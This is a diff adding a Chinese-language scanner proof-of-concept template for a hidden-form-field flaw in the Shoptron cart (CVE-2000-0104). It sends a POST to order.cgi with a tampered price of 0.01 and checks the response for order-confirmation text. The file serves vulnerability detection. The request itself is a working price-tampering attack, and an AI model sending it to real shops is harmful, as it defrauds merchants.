@@ -1,0 +1,37 @@
+[info]
+author = "AVE"
+description = "检测 Shoptron 购物车应用是否存在隐藏表单字段未校验漏洞。通过发送包含篡改后价格字段（price=0.01）的 POST 请求到订单提交接口，若响应包含成功订单确认信息，则说明服务端未对隐藏字段进行校验，存在数据篡改风险。"
+id = "POC-AVE-2000-0089"
+name = "Shoptron 购物车隐藏表单字段修改漏洞 PoC"
+severity = "high"
+tags = ["ave-2000-0089"]
+vuln_id = [
+    "CVE-2000-0104",
+    "AVE-2000-0089",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/order.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "item_id=1&quantity=1&price=0.01&submit=1"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Order Confirmed",
+    "order_number",
+    "Your order has been",
+    "Thank you for your order",
+]
